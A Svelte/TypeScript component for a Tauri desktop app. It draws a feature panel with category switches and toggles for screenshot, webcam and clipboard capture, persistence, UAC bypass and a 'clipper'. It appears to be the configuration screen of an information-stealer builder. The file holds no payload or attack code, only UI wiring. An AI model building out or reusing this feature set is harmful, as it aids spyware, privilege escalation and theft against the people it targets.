<script lang="ts">
  import { invoke } from "@tauri-apps/api/core";
  import { Button } from "$lib/components/ui/button";
  import {
    Accordion,
    AccordionContent,
    AccordionItem,
    AccordionTrigger,
  } from "$lib/components/ui/accordion";
  import {
    Dialog,
    DialogContent,
    DialogDescription,
    DialogHeader,
    DialogPortal,
    DialogTitle,
    DialogTrigger,
    DialogOverlay,
  } from "$lib/components/ui/dialog";
  import { Label } from "$lib/components/ui/label";
  import { Switch } from "$lib/components/ui/switch";
  import { featureLinks, detailSections, type FeatureDetail } from "./feature-data";

  type Category = {
    readonly id: string;
    readonly label: string;
  };

  type Props = {
    categories?: readonly Category[];
    categoryState?: Record<string, boolean>;
    selectedCategoryCount?: number;
    toggleCategory?: (id: string, checked: boolean) => void;
    showToast?: (message: string) => void;
    captureScreenshots?: boolean;
    captureWebcams?: boolean;
    captureClipboard?: boolean;
    persistence?: boolean;
    uacBypass?: boolean;
    clipper?: boolean;
    onToggleScreenshots?: () => void;
    onToggleWebcams?: () => void;
    onToggleClipboard?: () => void;
    onTogglePersistence?: () => void;
    onToggleUacBypass?: () => void;
    onToggleClipper?: () => void;
  };

  let {
    categories = [],
    categoryState = {},
    selectedCategoryCount = 0,
    toggleCategory = () => undefined,
    showToast = () => undefined,
    captureScreenshots = false,
    captureWebcams = false,
    captureClipboard = false,
    persistence = false,
    uacBypass = false,
    clipper = false,
    onToggleScreenshots = () => undefined,
    onToggleWebcams = () => undefined,
    onToggleClipboard = () => undefined,
    onTogglePersistence = () => undefined,
    onToggleUacBypass = () => undefined,
    onToggleClipper = () => undefined,
  }: Props = $props();

  const slugify = (value: string) =>
    value
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, "-")
      .replace(/^-|-$/g, "");

  const iconSrc = (value: string) => `/logos/${slugify(value)}.svg`;

  const handleFeatureClick = (label: string) => {
    const link = featureLinks[label];
    if (!link) return;
    invoke("plugin:opener|open_url", { url: link }).catch(console.error);
  };

  const handleCategoryToggle = (id: string) => {
    const nextValue = !categoryState[id];
    if (!nextValue && selectedCategoryCount <= 1 && categoryState[id]) {
      showToast("At least one category must stay enabled.");
      return;
    }
    toggleCategory(id, nextValue);
  };

  const coreFeatures = $derived([
    { label: "Screenshot", checked: captureScreenshots, toggle: onToggleScreenshots },
    { label: "Webcam", checked: captureWebcams, toggle: onToggleWebcams },
    { label: "Clipboard", checked: captureClipboard, toggle: onToggleClipboard },
    { label: "Persistence", checked: persistence, toggle: onTogglePersistence },
    { label: "UAC Bypass", checked: uacBypass, toggle: onToggleUacBypass },
    { label: "Clipper", checked: clipper, toggle: onToggleClipper },
  ]);
</script>

{#snippet featureCard(label: string, checked: boolean, toggle: () => void, switchAttr: string = "data-feature-switch")}
  <div
    class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/30 px-3 py-2 text-sm cursor-pointer"
    role="button"
    tabindex="0"
    onclick={(event) => {
      const target = event.target as HTMLElement | null;
      if (target?.closest?.(`[${switchAttr}]`)) return;
      toggle();
    }}
    onkeydown={(event) => {
      if (event.key === "Enter" || event.key === " ") {
        event.preventDefault();
        toggle();
      }
    }}
  >
    <Label class="text-sm cursor-pointer">{label}</Label>
    <Switch
      {...{ [switchAttr]: true }}
      class="cursor-pointer"
      {checked}
      onCheckedChange={toggle}
    />
  </div>
{/snippet}

<div class="space-y-4">
  <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
    <span class="text-primary">Features</span>
    <div class="flex justify-end">
      <Dialog>
        <DialogTrigger>
          <Button variant="link" size="sm" class="h-auto p-0 text-[10px] uppercase tracking-widest">
            What’s included?
          </Button>
        </DialogTrigger>
        <DialogPortal>
          <DialogOverlay class="bg-black/50 data-[state=open]:animate-fade-in" />
          <DialogContent class="max-h-[85vh] w-[min(90vw,640px)] space-y-6 overflow-y-auto rounded-xl bg-background p-6 shadow-lg data-[state=open]:animate-slide-in scrollbar-thin scrollbar-thumb-border scrollbar-track-muted">
            <DialogHeader>
              <DialogTitle>What’s included?</DialogTitle>
              <DialogDescription>Toggle categories and feature switches to include the artifacts listed below.</DialogDescription>
            </DialogHeader>
            <div class="flex flex-col gap-3">
              <Accordion type="single" class="space-y-3">
                {#each detailSections as section (section.title)}
                  <AccordionItem
                    class="border border-border/60 bg-muted/30 rounded-lg"
                    value={section.title}
                  >
                    <AccordionTrigger class="flex w-full items-center justify-between gap-2 rounded-lg px-4 py-3 text-sm font-semibold hover:bg-muted/60">
                      <span>{section.title}</span>
                      <span class="text-xs uppercase tracking-[0.3em] text-muted-foreground">
                        {section.items?.length ? `${section.items.length} items` : "Info"}
                      </span>
                    </AccordionTrigger>
                    <AccordionContent class="px-4 pb-3 pt-1 text-xs text-muted-foreground">
                      <p class="text-sm text-muted-foreground">{section.summary}</p>
                      {#if section.items}
                        <div class="mt-3 grid gap-2 text-[0.75rem] md:grid-cols-2">
                          {#each section.items as item}
                            <Button
                              variant="secondary"
                              size="sm"
                              class="flex-1 gap-2 overflow-hidden whitespace-nowrap text-xs font-medium"
                              type="button"
                              disabled={!featureLinks[item]}
                              aria-label={featureLinks[item] ? `Open ${item} site` : item}
                              onclick={() => handleFeatureClick(item)}
                            >
                              <img
                                src={iconSrc(item)}
                                alt=""
                                loading="lazy"
                                class="h-4 w-auto shrink-0 object-contain"
                              />
                              <span class="truncate">{item}</span>
                            </Button>
                          {/each}
                        </div>
                      {/if}
                    </AccordionContent>
                  </AccordionItem>
                {/each}
              </Accordion>
            </div>
          </DialogContent>
        </DialogPortal>
      </Dialog>
    </div>
  </div>
  <p class="text-xs text-muted-foreground">
    Toggle categories to include. At least one category must stay enabled.
  </p>
  <div class="grid gap-3 sm:grid-cols-2 lg:grid-cols-3">
    {#each categories as category}
      <div
        class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/30 px-3 py-2 text-sm cursor-pointer"
        role="button"
        tabindex="0"
        onclick={(event) => {
          const target = event.target as HTMLElement | null;
          if (target?.closest?.("[data-category-switch]")) return;
          handleCategoryToggle(category.id);
        }}
        onkeydown={(event) => {
          if (event.key === "Enter" || event.key === " ") {
            event.preventDefault();
            handleCategoryToggle(category.id);
          }
        }}
      >
        <Label class="text-sm cursor-pointer">{category.label}</Label>
        <Switch
          id={`category-${category.id}`}
          data-category-switch
          class="cursor-pointer"
          checked={categoryState[category.id]}
          onclick={(event) => {
            if (categoryState[category.id] && selectedCategoryCount <= 1) {
              event.preventDefault();
              event.stopPropagation();
              showToast("At least one category must stay enabled.");
            }
          }}
          onCheckedChange={() => handleCategoryToggle(category.id)}
        />
      </div>
    {/each}
    {#each coreFeatures as feature}
      {@render featureCard(feature.label, feature.checked, feature.toggle)}
    {/each}
  </div>
</div>
